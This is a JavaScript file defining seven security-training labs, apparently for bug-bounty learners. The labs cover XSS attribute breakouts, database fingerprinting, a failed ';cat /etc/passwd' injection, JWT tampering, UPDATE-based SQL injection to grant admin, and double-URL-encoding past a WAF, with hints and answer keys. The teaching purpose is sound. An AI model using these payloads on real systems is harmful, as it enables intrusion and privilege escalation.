/* ============================================================
   HackRange labs · Payload Adaptation (7 labs)
   Not a cheat sheet. Each lab is a failed attempt with evidence:
   read the request, the response, the context, then produce the
   fix. This is the skill that turns basic findings into bounties.
   ============================================================ */

HR.defineLab({
  id: 'adapt-01', cat: 'adapt', diff: 2,
  title: 'The Payload That Did Nothing',
  brief: 'You found a reflected search parameter on a shop. You fired the most famous payload in history at it. The app accepted it, reflected it, and nothing happened. No popup, no blocked message, nothing. Your payload was not filtered. It was misplaced. Diagnose the context from the response and produce a payload that works THERE.',
  env: {
    type: 'static',
    blocks: [
      { t: 'req', method: 'GET', url: '/search?q=<script>alert(1)</script>', headers: 'Host: shop.example\nUser-Agent: Mozilla/5.0' },
      { t: 'res', status: '200 OK', headers: 'Content-Type: text/html', text: '<html>\n  <body>\n    <h1>Search results</h1>\n    <input type="text" name="q" value="<script>alert(1)</script>" placeholder="search">\n    <p>0 results found.</p>\n  </body>\n</html>' },
      { t: 'p', html: 'The payload was reflected but inert. <b>Enter the corrected payload</b> that would actually execute here.' }
    ]
  },
  flagNote: 'Submit the fixed payload, for example in the form: ">&lt;tag handler=...>',
  hints: [
    'Read the response body. WHERE did the payload land? Inside an attribute value of an input tag, between double quotes.',
    'Inside an attribute, angle brackets are just characters. You must first close the attribute and the tag.',
    'Prefix your payload with "> to escape the attribute, then use any handler payload: "><svg onload=alert(1)>'
  ],
  walk: 'The response shows <span class="mono">value="&lt;script&gt;alert(1)&lt;/script&gt;"</span>: the payload is inside a double quoted attribute, so the browser treats it as inert text. Break out first: <span class="mono">"&gt;</span> closes the attribute and the input tag, then your real payload executes: <span class="mono">"&gt;&lt;svg onload=alert(1)&gt;</span>. The diagnostic habit to burn in: payload fails, do not iterate blindly. Read the response, find the context (html body, attribute, js string, comment, url), then choose the breakout. Context first, payload second. That single discipline separates researchers who escalate findings from those who move on.',
  study: 'SecLab · Payload Lab · context ladder, then re-read the breakout rules.'
});

HR.defineLab({
  id: 'adapt-02', cat: 'adapt', diff: 2,
  title: 'The Confession in the Stack Trace',
  brief: 'You injected a quote into a parameter and the app did something careless: it showed you a raw exception. Most beginners close the tab. You should lean in, because framework errors identify the framework, the database, sometimes the file path and the query itself. What database is this app running?',
  env: {
    type: 'static',
    blocks: [
      { t: 'req', method: 'GET', url: '/items?name=orange\'', headers: 'Host: shop.example' },
      { t: 'res', status: '500 Internal Server Error', headers: 'Content-Type: text/plain', text: 'org.postgresql.util.PSQLException:\nERROR: syntax error at or near "\'"\n  Position: 42\n  Statement: SELECT * FROM items WHERE name = \'orange\'\'' },
      { t: 'p', html: 'The error tells you exactly what you are fighting. <b>Which database product is it?</b> (one word)' }
    ]
  },
  flagNote: 'One word. The class name in the first line says it.',
  hints: [
    'The first line is a Java class name: org.<something>.util.PSQLException. Read the middle word.',
    'PSQLException is the PostgreSQL JDBC driver. The P is not decorative.',
    'The answer is the database whose errors come wrapped in org.postgresql classes.'
  ],
  walk: 'The stack trace opens with <span class="mono">org.postgresql.util.PSQLException</span>, the PostgreSQL JDBC exception class. So the backend is PostgreSQL. Fingerprinting matters because dialects differ: comments (<span class="mono">--</span> works everywhere, <span class="mono">#</span> is MySQL only), string concat (<span class="mono">||</span> in Postgres, <span class="mono">CONCAT()</span> in MySQL), sleep functions (<span class="mono">pg_sleep</span> vs <span class="mono">SLEEP</span>), and error message styles. The flag is <span class="mono">HR{postgresql}</span>. Every unexpected error is a data point: file paths leak in Java traces, queries leak in PHP traces, version numbers leak in almost all of them.',
  study: 'SecLab · Payload Lab · database fingerprint cards for all four major engines.'
});

HR.defineLab({
  id: 'adapt-03', cat: 'adapt', diff: 3,
  title: 'The Handler That Never Fired',
  brief: 'Progress: you broke out of the attribute, your tag landed in the HTML body, and the page happily renders <input onfocus=alert(1)>. And still nothing happens. No filter blocked you. The tag is there. The handler is there. The answer is one missing attribute away.',
  env: {
    type: 'static',
    blocks: [
      { t: 'req', method: 'GET', url: '/search?q="><input onfocus=alert(1)>', headers: 'Host: shop.example' },
      { t: 'res', status: '200 OK', headers: 'Content-Type: text/html', text: '<html>\n  <body>\n    <h1>Search results</h1>\n    <input onfocus=alert(1)>\n    <p>0 results found.</p>\n  </body>\n</html>' },
      { t: 'p', html: 'The payload is in the body as real HTML with a valid event handler, yet nothing executes. <b>Submit the corrected payload.</b>' }
    ]
  },
  flagNote: 'Add one attribute. Submit the full payload.',
  hints: [
    'onfocus fires when the element RECEIVES focus. An element nobody focuses never fires the handler.',
    'You need the browser to focus the element automatically, without a click. There is an attribute that requests focus on page load.',
    'autofocus. The payload becomes: <input autofocus onfocus=alert(1)>'
  ],
  walk: 'The handler is valid but dormant: <span class="mono">onfocus</span> waits for focus that never comes. Adding <span class="mono">autofocus</span> makes the browser focus the input on page load, firing the handler instantly: <span class="mono">&lt;input autofocus onfocus=alert(1)&gt;</span>. The general pattern: an event handler is only as good as its TRIGGER. Pair each handler with something that triggers it without user interaction: <span class="mono">onerror</span> with a broken src, <span class="mono">onload</span> with a loadable element, <span class="mono">ontoggle</span> with <span class="mono">details open</span>, <span class="mono">onfocus</span> with <span class="mono">autofocus</span>. Payloads are pairs: trigger plus handler.',
  study: 'SecLab · Payload Lab · event handler taxonomy grouped by trigger type.'
});

HR.defineLab({
  id: 'adapt-04', cat: 'adapt', diff: 3,
  title: 'The Injection That Was Never There',
  brief: 'A report claims command injection on a DNS lookup tool. You test it: ; cat /etc/passwd. The response is weird. There is no blocked message, no error, no passwd content. Instead the tool complains about resolving strange hostnames. Understand what the application actually does with your input before you trust any report.',
  env: {
    type: 'static',
    blocks: [
      { t: 'req', method: 'POST', url: '/api/lookup', headers: 'Host: nettool.example\nContent-Type: application/json', body: '{"host": "example.com; cat /etc/passwd"}' },
      { t: 'res', status: '200 OK', headers: 'Content-Type: application/json', text: '{\n  "error": "lookup failed",\n  "details": "ping: cannot resolve ;: Unknown host\\nping: cannot resolve cat: Unknown host\\nping: cannot resolve /etc/passwd: Unknown host"\n}' },
      { t: 'mc', q: 'Why did the command injection fail?', options: [
        'A WAF stripped the semicolon and the spaces from your input',
        'The application passes your input to ping as ARGUMENTS, without a shell ever seeing it',
        'The cat binary is not installed on the server',
        'You must URL-encode the semicolon for it to work'
      ] }
    ]
  },
  flagNote: 'Pick the answer, then submit its letter (A, B, C or D).',
  hints: [
    'Read the error literally: ping tried to RESOLVE ";", "cat" and "/etc/passwd" as if they were hostnames. Your input was split and passed to ping directly.',
    'If a shell had seen your input, ; would have started a new command. It did not. No shell was involved.',
    'The app calls ping with an argument array (execve style). Without a shell, there is nothing to inject into.'
  ],
  walk: 'The evidence: ping received <span class="mono">;</span>, <span class="mono">cat</span> and <span class="mono">/etc/passwd</span> as separate HOSTNAME arguments. That means the app split your input and passed the pieces to ping WITHOUT a shell. Shell metacharacters are meaningless when no shell parses them: this is <span class="mono">execve("ping", ["ping", ...args])</span>, not <span class="mono">system()</span>. The correct answer is B. Reporting this as command injection would be a false positive that burns your credibility. The professional move: identify the invocation style FIRST (response behavior tells you), and when you write code reviews, recommend argument arrays over shell strings as the FIX for real command injection.',
  study: 'SecLab · Payload Lab · invocation styles: system vs execve, the decisive difference.'
});

HR.defineLab({
  id: 'adapt-05', cat: 'adapt', diff: 3,
  title: 'The Signature Knows',
  brief: 'You captured your own session token, decoded it, changed role from user to admin (nice try, everyone does), and replayed it. The server said no. The token LOOKS the same, the payload changed by three letters, and yet the server caught you instantly. Understand exactly why, because your next JWT attack depends on this.',
  env: {
    type: 'static',
    blocks: [
      { t: 'code', title: 'Original token', text: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3Iiwicm9sZSI6InVzZXIifQ.KDS0kPjLxqVE6E5S7cGw0bXJ8vN2mQ9R3tYhZ1aF4eI' },
      { t: 'code', title: 'Modified token (role changed to admin)', text: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3Iiwicm9sZSI6ImFkbWluIn0.KDS0kPjLxqVE6E5S7cGw0bXJ8vN2mQ9R3tYhZ1aF4eI' },
      { t: 'res', status: '401 Unauthorized', headers: 'WWW-Authenticate: Bearer error="invalid_token"', text: '{"error": "invalid signature"}' },
      { t: 'mc', q: 'Why did the server reject the modified token?', options: [
        'The signature no longer matches the modified payload, because the signature is computed over header + payload',
        'The token expired while you were editing it',
        'JWTs cannot be modified once issued, it is impossible by design',
        'You must also change the alg header to none for edits to be accepted'
      ] }
    ]
  },
  flagNote: 'Pick the answer, then submit its letter (A, B, C or D).',
  hints: [
    'A JWT signature is HMAC(secret, header + payload). Change the payload and the mathematical result changes.',
    'You kept the OLD signature over NEW content. The server recomputes and compares. It does not match.',
    'The answer describes signature coverage: header plus payload.'
  ],
  walk: 'The signature is <span class="mono">HMAC(secret, base64url(header) + "." + base64url(payload))</span>. You changed the payload but kept the old signature, so the recomputation cannot match: 401 invalid signature. The correct answer is A. This is the exact property that makes JWTs useful, and its weaknesses are the real attack surface: weak secrets (crack the HMAC offline with hashcat), algorithm confusion (alg none or RS256 to HS256 key swap), and unverified claims. Editing a token is step zero of every JWT attack, and it always fails the same way. What you do AFTER that failure is the actual attack.',
  study: 'SecLab · Payload Lab · JWT structure and the three real JWT attack classes.'
});

HR.defineLab({
  id: 'adapt-06', cat: 'adapt', diff: 3,
  title: 'The UPDATE Nobody Expected',
  brief: 'SQL injection tutorials teach SELECT and login forms. Real applications also inject UPDATE statements, and they behave differently: there is no result table, and comments can BREAK the query instead of fixing it. Your injection point is a profile name field that updates YOUR user row. Turn yourself into an admin.',
  env: {
    type: 'static',
    blocks: [
      { t: 'code', title: 'Backend query (recovered from a code review)', text: "UPDATE users SET name='$IN' WHERE id=42" },
      { t: 'p', html: 'Your user id is 42. The goal: also set is_admin to 1 in the same statement. Four students proposed payloads. Which one actually works?' },
      { t: 'mc', q: 'Which payload turns user 42 into an admin?', options: [
        "' UNION SELECT is_admin='1",
        "', is_admin='1",
        "'; UPDATE users SET is_admin='1 WHERE id=42-- -",
        "' OR is_admin='1"
      ] }
    ]
  },
  flagNote: 'Pick the answer, then submit its letter (A, B, C or D).',
  hints: [
    'Trace each option through the template. Option A: UNION in an UPDATE is a syntax error in MySQL. Option C: stacked queries are disabled by default in PHP mysql_query and most drivers.',
    'Option D: OR affects the WHERE clause (which rows update), not WHICH columns get set. It would update every row\'s name, not grant admin.',
    'Option B: the quote closes the name string, the comma starts a NEW column assignment: name=\'x\', is_admin=\'1\' WHERE id=42. Clean and legal.'
  ],
  walk: 'Substituting option B: <span class="mono">UPDATE users SET name=\'x\', is_admin=\'1\' WHERE id=42</span>. The quote terminates the name value, the comma adds a second column to the SET clause, and the original WHERE still limits the change to your row. This is injection INSIDE an UPDATE, one of the highest impact contexts because it writes. Option A is a syntax error (UNION wants a SELECT), option C needs stacked queries which most web drivers disable, option D only widens the WHERE. The flag is B. When you meet an unfamiliar injection context (UPDATE, INSERT, ORDER BY, LIMIT, column names), the discipline is always the same: write the full statement on paper with your payload inside it, then read what the database reads.',
  study: 'SecLab · Payload Lab · injection contexts beyond SELECT.'
});

HR.defineLab({
  id: 'adapt-07', cat: 'adapt', diff: 4,
  title: 'Decode Me Twice',
  brief: 'An enterprise WAF blocks any request body containing the words union or select, case insensitive, before the request reaches a Java application. You tried case tricks and comment splitting: dead. Then you noticed something in the documentation: the framework URL decodes parameters TWICE. Once in the router, once in the servlet. The WAF inspects the raw body. Do the math and pick the bypass that reaches the backend.',
  env: {
    type: 'static',
    blocks: [
      { t: 'code', title: 'Your blocked attempt', text: 'POST /search HTTP/1.1\nHost: enterprise.example\n\nq=x%27+UNION+SELECT+password+FROM+users\n\n--- WAF response: 403 Forbidden (matched: UNION) ---' },
      { t: 'p', html: 'The framework decodes parameters two times. The WAF reads the body once, raw. <b>Which payload passes the WAF and still becomes UNION SELECT after decoding?</b>' },
      { t: 'mc', q: 'Pick the working bypass:', options: [
        'SeLeCt and UnIoN mixed case',
        'unio%6e sel%65ct (single URL encoding)',
        '%2555nion %2553elect (double URL encoding)',
        'UN/**/ION SEL/**/ECT (comment splitting)'
      ] }
    ]
  },
  flagNote: 'Pick the answer, then submit its letter (A, B, C or D).',
  hints: [
    'The WAF decodes the body once before matching keywords. So single encoding (option B) becomes UNION before the match happens and dies. You need a payload that survives one decode and still hides the keyword.',
    'If the WAF decodes once, you need a payload that still looks innocent after one decode but becomes the keyword after the second. That is double encoding: %25 is the encoding of the % character itself.',
    '%2555 decodes once to %55, twice to U. So %2555nion becomes union only after both decodes. The WAF, decoding once, sees %55nion and finds no keyword.'
  ],
  walk: 'Double URL encoding: <span class="mono">%25</span> decodes to <span class="mono">%</span>, so <span class="mono">%2555</span> decodes once to <span class="mono">%55</span> (still innocent) and twice to <span class="mono">U</span>. The payload <span class="mono">%2555nion %2553elect</span> survives the WAF\'s single decode and becomes <span class="mono">UNION SELECT</span> in the servlet\'s second decode. The answer is C. Option A fails because the WAF matches case insensitively, option B fails because the WAF decodes once before matching, option D fails because the WAF strips or matches around comments. The meta lesson: every filter has a POSITION in the request pipeline. Map the pipeline (raw body, WAF decode count, framework decode count) and place your payload in the gap between what each layer sees.',
  study: 'SecLab · Payload Lab · encoding layers and pipeline positioning.'
});
